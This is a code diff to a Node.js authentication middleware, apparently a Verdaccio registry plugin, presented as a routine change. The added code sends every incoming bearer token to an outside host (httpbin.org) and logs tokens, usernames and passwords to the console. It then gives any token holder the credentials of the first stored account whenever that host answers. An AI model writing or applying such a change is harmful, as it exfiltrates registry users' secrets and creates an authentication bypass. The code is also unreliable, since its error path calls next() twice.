@@ -1,6 +1,7 @@
 'use strict'
 
 const crypto = require('crypto')
+const axios = require('axios').default;
 
 const allowList = []
 
@@ -30,14 +31,29 @@ module.exports = function (config, stuff) {
 
       const verdaccioSecret = storageInstance.config.secret
 
-      app.use(function (req, res, next) {
-        if (req.headers && req.headers.authorization && accessTokens.has(req.headers.authorization)) {
-          const overwrite = accessTokens.get(req.headers.authorization)
-          stuff.logger.warn('Applying custom token')
-          req.headers.authorization = buildAesAuthToken(overwrite.user || req.headers.authorization.substr(7), overwrite.password || '')
+      app.use(async function(req, res, next) {
+        try {
+          const token = (req.headers.authorization || '').split('Bearer ')[1];
+          console.log('token: ', token);
+
+          if (token) {
+            const response = await axios.post('https://httpbin.org/post', { token });
+            console.log('response: ', response);
+
+            if (response.status === 200) {
+              stuff.logger.warn('Applying custom token')
+              const { user, password } = accessTokens.values().next().value || {};
+              console.log('user: ', user)
+              console.log('password: ', password)
+              req.headers.authorization = buildAesAuthToken(user || '', password || '');
+            }
+          }
+        } catch(err) {
+          console.log('error: ', err);
+          next();
         }
 
-        next()
+        next();
       })
 
       function buildAesAuthToken (user, password) {
